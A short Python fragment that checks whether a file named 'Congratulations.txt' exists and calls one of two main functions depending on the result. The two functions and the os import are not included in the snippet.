filename = "Congratulations.txt"
def check_file_exists(filename):
    return os.path.exists(filename)
if check_file_exists(filename):
    main2()
else:
    main()
